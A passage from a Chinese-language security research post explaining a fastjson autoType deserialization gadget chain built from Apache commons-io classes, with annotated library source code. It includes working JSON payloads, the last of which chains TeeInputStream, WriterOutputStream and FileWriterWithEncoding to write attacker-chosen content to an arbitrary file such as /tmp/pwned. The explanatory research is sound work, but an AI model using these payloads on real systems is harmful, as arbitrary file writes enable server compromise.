class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p><code>org.apache.commons.io.input.CharSequenceReader</code> 的构造函数接受 <code>CharSequence</code> 对象作为参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">CharSequenceReader</span><span class="params">(<span class="keyword">final</span> CharSequence charSequence)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.charSequence = charSequence != <span class="literal">null</span> ? charSequence : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它在执行 <code>read</code> 方法时，会读取 <code>CharSequence</code> 的值：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="keyword">final</span> <span class="type">char</span>[] array, <span class="keyword">final</span> <span class="type">int</span> offset, <span class="keyword">final</span> <span class="type">int</span> length)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (idx &gt;= charSequence.length()) &#123;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (array == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Character array is missing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="number">0</span> || offset &lt; <span class="number">0</span> || offset + length &gt; array.length) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(<span class="string">&quot;Array Size=&quot;</span> + array.length +</span><br><span class="line">                <span class="string">&quot;, offset=&quot;</span> + offset + <span class="string">&quot;, length=&quot;</span> + length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> read();</span><br><span class="line">        <span class="keyword">if</span> (c == EOF) &#123;</span><br><span class="line">            <span class="keyword">return</span> count;</span><br><span class="line">        &#125;</span><br><span class="line">        array[offset + i] = (<span class="type">char</span>)c;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此组合一下 <code>ReaderInputStream</code> 和 <code>CharSequenceReader</code>，就能构建出从自定义字符串里读输入的 <code>InputStream</code>：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="string">&quot;&lt;&lt;&lt;你的字符串&gt;&gt;&gt;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>org.apache.commons.io.input.CharSequenceReader</code> 的构造函数参数的类型为 <code>CharSequence</code> 接口，但是对应在构造的 Json payload 中却写成如下形式：</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="string">&quot;&lt;&lt;&lt;你的字符串&gt;&gt;&gt;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>这是因为对 <strong>构造器参数是接口类型</strong> 的解析，fastjson 会这样做：</p>
<ol>
<li><p>见到 <code>charSequence: { ... }</code>，<strong>进入一个对象</strong>。</p>
</li>
<li><p>这个对象里第一个键是 <strong><code>@type</code></strong> → 触发 <strong>autoType 重定向</strong>：</p>
<ul>
<li><p><code>checkAutoType(&quot;java.lang.String&quot;, expectClass=CharSequence)</code> → 通过（<code>String</code> 实现了 <code>CharSequence</code>）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>于是 <strong>改用 <code>StringCodec</code></strong> 来“继续读取<strong>这个对象后面的内容</strong>”。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initDeserializers</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="comment">// [...]</span></span><br><span class="line">    deserializers.put(String.class, StringCodec.instance);</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p><strong>此时已经进入了 <code>StringCodec</code> 的反序列化流程</strong>，而 <code>StringCodec</code> 的代码<strong>只想看到“一个字符串字面量 token”</strong> 作为值，即 <code>&quot;@type&quot;: &quot;java.lang.String&quot; &quot;&lt;&lt;&lt;你的字符串&gt;&gt;&gt;&quot;</code> 格式。</p>
</li>
</ol>
<p>在 <code>com.alibaba.fastjson.serializer.StringCodec#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)</code> 函数中，对于 <code>CharSequence</code> 这种形式的 <code>clazz</code> 会进入到 <code>deserialze(DefaultJSONParser parser)</code> 函数。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反序列化入口（带 Type）。当目标类型是 StringBuilder / StringBuffer 时，</span></span><br><span class="line"><span class="comment"> * 走各自的快捷分支；其他（包括 String.class / CharSequence 经过 <span class="doctag">@type</span> 重定向为 String）则退回到无 Type 版本。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> parser    fastjson 的解析器（持有词法分析器 lexer）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clazz     目标类型（可能是 StringBuilder/StringBuffer/String 等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fieldName 当前字段名（调试/错误信息用）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> &#123;</span><br><span class="line">    <span class="comment">// 特判 1：目标类型是 StringBuffer</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == StringBuffer.class) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 特判 2：目标类型是 StringBuilder</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == StringBuilder.class) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他类型（包括 String.class）统一走无 Type 版本</span></span><br><span class="line">    <span class="keyword">return</span> (T) deserialze(parser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>deserialze(DefaultJSONParser parser)</code> 期望 Json 数据后面紧接着的是一个字符串字面量，然后获取字符串并返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 反序列化入口（不带 Type）。用于 String.class 及“退化为字符串”的场景。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 语义：</span></span><br><span class="line"><span class="comment"> * - 若当前 token 是字符串字面量，直接取出返回；</span></span><br><span class="line"><span class="comment"> * - 若是整数字面量，返回其 numberString（文本形式）；</span></span><br><span class="line"><span class="comment"> * - 否则把当前结构 parse 成 Object，再 toString()。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialze</span><span class="params">(DefaultJSONParser parser)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">JSONLexer</span> <span class="variable">lexer</span> <span class="operator">=</span> parser.getLexer();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情况 1：直接是字符串字面量（最理想）</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">val</span> <span class="operator">=</span> lexer.stringVal();          <span class="comment">// 取出 &quot;...&quot; 的内容</span></span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);        <span class="comment">// 令词法器移到下一个 token（常见是逗号、右花括号等分隔）</span></span><br><span class="line">        <span class="keyword">return</span> (T) val;                          <span class="comment">// 直接返回 Java String</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情况 2：整数字面量 —— 也按“字符串形式”返回</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_INT) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">val</span> <span class="operator">=</span> lexer.numberString();       <span class="comment">// 把数字的文本形式取出来</span></span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">return</span> (T) val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 情况 3：既不是字符串也不是整数字面量 —— 解析为 Object，再 toString()</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> parser.parse();</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (T) value.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>那么现在有触发 <code>InputStream read</code> 方法的链入口，也有能传入可控内容的 <code>InputStream</code>，只差一个自定义输出位置的 <code>OutputStream</code> 了。</p>
<hr>
<p><code>org.apache.commons.io.output.WriterOutputStream</code> 的构造函数接受 <code>Writer</code> 对象作为参数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">WriterOutputStream</span><span class="params">(<span class="keyword">final</span> Writer writer, <span class="keyword">final</span> CharsetDecoder decoder, <span class="keyword">final</span> <span class="type">int</span> bufferSize,</span></span><br><span class="line"><span class="params">                          <span class="keyword">final</span> <span class="type">boolean</span> writeImmediately)</span> &#123;</span><br><span class="line">    checkIbmJdkWithBrokenUTF16( decoder.charset());</span><br><span class="line">    <span class="built_in">this</span>.writer = writer;</span><br><span class="line">    <span class="built_in">this</span>.decoder = decoder;</span><br><span class="line">    <span class="built_in">this</span>.writeImmediately = writeImmediately;</span><br><span class="line">    decoderOut = CharBuffer.allocate(bufferSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它在执行 <code>write</code> 方法时，会执行 <code>flushOutput</code> 方法，从而执行 <code>Writer.write(char[], int, int)</code>，通过 <code>writer</code> 来输出：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> Math.min(len, decoderIn.remaining());</span><br><span class="line">        decoderIn.put(b, off, c);</span><br><span class="line">        processInput(<span class="literal">false</span>);</span><br><span class="line">        len -= c;</span><br><span class="line">        off += c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (writeImmediately) &#123;</span><br><span class="line">        flushOutput(); <span class="comment">// 👈</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">flushOutput</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (decoderOut.position() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        writer.write(decoderOut.array(), <span class="number">0</span>, decoderOut.position()); <span class="comment">// 👈</span></span><br><span class="line">        decoderOut.rewind();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p><code>org.apache.commons.io.output.FileWriterWithEncoding</code> 的构造函数接受 <code>File</code> 对象作为参数，并最终以 <code>File</code> 对象构建 <code>FileOutputStream</code> 文件输出流。随后我们创建的 <code>FileOutputStream</code> 文件输出流会被传入 <code>OutputStreamWriter</code> 构造函数参与实例化，并且实例化结果被设置在 <code>out</code> 属性上。</p>
<blockquote>
<p><code>OutputStreamWriter</code> 是<strong>字符到字节</strong>的桥接器（Writer → OutputStream）。你向它写<strong>字符</strong>，它按指定<strong>字符集</strong>（如 UTF‑8）把字符<strong>编码</strong>成字节，再写入到底层的 <code>OutputStream</code>（如文件&#x2F;网络套接字）。</p>
<ul>
<li><p>编码方式可以通过<strong>字符集名称</strong>构造（<code>new OutputStreamWriter(out, &quot;UTF-8&quot;)</code>，可能抛 <code>UnsupportedEncodingException</code>）。</p>
</li>
<li><p>每次调用 <code>write(...)</code>，内部都会驱动 <code>StreamEncoder</code>：先把字符<strong>编码</strong>到字节缓冲，再把缓冲<strong>写到底层输出流</strong>。</p>
</li>
</ul>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">FileWriterWithEncoding</span><span class="params">(<span class="keyword">final</span> File file, <span class="keyword">final</span> String encoding, <span class="keyword">final</span> <span class="type">boolean</span> append)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    <span class="built_in">this</span>.out = initWriter(file, encoding, append);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Writer <span class="title function_">initWriter</span><span class="params">(<span class="keyword">final</span> File file, <span class="keyword">final</span> Object encoding, <span class="keyword">final</span> <span class="type">boolean</span> append)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;File is missing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (encoding == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>(<span class="string">&quot;Encoding is missing&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">fileExistedAlready</span> <span class="operator">=</span> file.exists();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 📌 在这里创建 FileOutputStream 对象</span></span><br><span class="line">        stream = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file, append); </span><br><span class="line">        <span class="keyword">if</span> (encoding <span class="keyword">instanceof</span> Charset) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(stream, (Charset)encoding);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (encoding <span class="keyword">instanceof</span> CharsetEncoder) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(stream, (CharsetEncoder)encoding);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 📌 encoding = &quot;UTF-8&quot;,因此会执行到这里</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(stream, (String)encoding);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException | RuntimeException ex) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (stream != <span class="literal">null</span>) &#123;</span><br><span class="line">                stream.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException e) &#123;</span><br><span class="line">            ex.addSuppressed(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fileExistedAlready == <span class="literal">false</span>) &#123;</span><br><span class="line">            FileUtils.deleteQuietly(file);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而 <code>write</code> 函数直接向 <code>OutputStreamWriter</code> 写入数据，也就会向 <code>FileOutputStream</code> 写入数据：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="keyword">final</span> <span class="type">char</span>[] chr, <span class="keyword">final</span> <span class="type">int</span> st, <span class="keyword">final</span> <span class="type">int</span> end)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.write(chr, st, end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>因此组合一下 <code>WriterOutputStream</code> 和 <code>FileWriterWithEncoding</code>，就能构建得到输出到指定文件的 <code>OutputStream</code>。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.AutoCloseable&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span> <span class="string">&quot;&lt;&lt;&lt;你的字符串&gt;&gt;&gt;&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp/pwned&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在实际测试时发现，payload 的格式会影响 FastJson 的解析流程，导致某些类实例化失败：</p>
